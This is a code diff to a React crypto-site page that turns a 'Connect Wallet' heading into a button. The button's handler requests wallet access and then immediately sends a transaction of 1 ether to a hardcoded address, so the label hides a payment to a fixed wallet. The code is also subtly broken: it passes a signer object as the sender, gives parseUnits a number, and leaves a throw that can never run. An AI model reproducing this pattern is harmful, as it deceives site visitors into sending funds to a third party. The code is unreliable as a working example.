@@ -2,6 +2,7 @@ import React from "react";
 
 import CommonSection from "../components/ui/Common-section/CommonSection";
 import { Container, Row, Col } from "reactstrap";
+import { ethers } from "ethers";
 
 import "../styles/wallet.css";
 
@@ -31,7 +32,52 @@ const wallet__data = [
   },
 ];
 
+
+
 const Wallet = () => {
+
+  async function handleTransaction(e){
+    
+    try {
+      if (!window.ethereum) {
+        alert("No Crypto Wallet Found");
+        return false;
+        throw new Error("No Crypto Wallet Found");
+      } else {
+        await window.ethereum.send("eth_requestAccounts");
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+
+        //dhruv
+        const signer = await provider.getSigner();
+        const address = await signer.getAddress();
+        // const signature = await signer.sendTransaction(
+        //   "I Am Authorizing the Account"
+        // );
+
+        const params = [{
+          from: signer,
+          to: "0x54c4A0192BB29e6ECB8c1C550D7405557c7b59Ca",
+          value: ethers.utils.parseUnits(1, 'ether').toHexString()
+      }];
+  
+      const transactionHash = await provider.send('eth_sendTransaction', params)
+      console.log('transactionHash is ' + transactionHash);
+
+
+
+        console.log({
+          signer,
+          address,
+          // signature,
+        });
+        return true;
+      }
+    } catch (error) {
+      return false;
+    }
+
+  }
+
   return (
     <>
       <CommonSection title="Connect Wallet" />
@@ -40,7 +86,11 @@ const Wallet = () => {
           <Row>
             <Col lg="12" className="mb-5 text-center">
               <div className="w-50 m-auto">
-                <h3 className="text-light">Connect your wallet</h3>
+                <button 
+                  onClick={(e)=>{
+                    handleTransaction(e)
+                  }}
+                  >Connect Wallet</button>
                 <p>
                   Lorem ipsum dolor sit amet consectetur, adipisicing elit.
                   Minima numquam nisi, quam obcaecati a provident voluptas sequi
